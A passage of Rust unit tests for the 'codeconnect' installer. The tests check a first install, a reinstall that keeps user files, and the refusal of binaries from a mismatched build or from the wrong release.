            install_staged_at(root, &from, &running(), deps)
        })
    }

    /// A first install: no `bin` at all. The binaries come from the
    /// installer's directory, tmux from the same release, and the whole set
    /// lands in one exchange, proven before the daemon is touched.
    #[test]
    fn a_first_install_lands_the_binaries_and_their_tmux_together() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_dir_all(&fixture.live).unwrap();

        let ran = install_staged(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        let mut installed: Vec<String> = snapshot(&fixture.live).into_keys().collect();
        installed.sort();
        assert_eq!(
            installed,
            [
                "LICENSE",
                "THIRD_PARTY_NOTICES",
                "cc-hook",
                "cc-tmux",
                "ccd",
                "codeconnect"
            ]
        );
        assert_eq!(
            ran.events
                .iter()
                .filter(|event| event.starts_with("download"))
                .count(),
            2,
            "only the tmux archive and its checksum are fetched: {:?}",
            ran.events
        );
        for smoke in [
            "probe live/codeconnect",
            "probe live/ccd",
            "probe live/cc-hook",
            "ask live/cc-tmux -V",
        ] {
            assert!(
                ran.events.iter().any(|event| event == smoke),
                "{smoke}: {:?}",
                ran.events
            );
        }
        assert_eq!(ran.events.last().map(String::as_str), Some("restart"));
        assert!(!crate::update_install::staging_dir(&fixture.root).exists());
        assert!(!fixture.root.join("update.work").exists());
    }

    /// Over an existing install — the installer's `--reinstall` — the same
    /// exchange keeps what the user put in `bin`.
    #[test]
    fn a_reinstall_keeps_what_the_release_does_not_ship() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        let ran = install_staged(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        assert_eq!(
            snapshot(&fixture.live)["stranger.txt"],
            b"not ours to judge"
        );
        assert_eq!(
            line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
            "release"
        );
    }

    /// The installer verified these binaries itself; they are proven again
    /// here by the same rules `update` applies, and a set that fails them is
    /// refused with nothing installed.
    #[test]
    fn a_handed_over_binary_that_fails_the_updaters_rules_is_refused() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_dir_all(&fixture.live).unwrap();
        let from = fixture
            .root
            .join("fixtures")
            .join(format!("codeconnect-{}", running()));
        place_binary(
            &from.join("ccd"),
            fixture_binary("ccd", &running(), "dddddddddddd", false),
        );
        let ran = install_staged(&fixture, Faults::default());
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains("mixes builds"), "{said}");
        assert!(
            !fixture.live.exists() || snapshot(&fixture.live).is_empty(),
            "nothing was installed"
        );
        assert!(!ran.events.contains(&"restart".to_string()));
    }

    #[test]
    fn the_installer_refuses_a_release_that_is_not_its_own() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let from = fixture
            .root
            .join("fixtures")
            .join(format!("codeconnect-{}", newer()));
        let before = snapshot(&fixture.live);
        let ran = run_entry(&fixture, Faults::default(), |root, deps| {
            install_staged_at(root, &from, &running(), deps)
        });
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains("answered with"), "{said}");
        assert_eq!(ran.events, vec!["fetch".to_string()]);
        assert_eq!(snapshot(&fixture.live), before);
    }
}
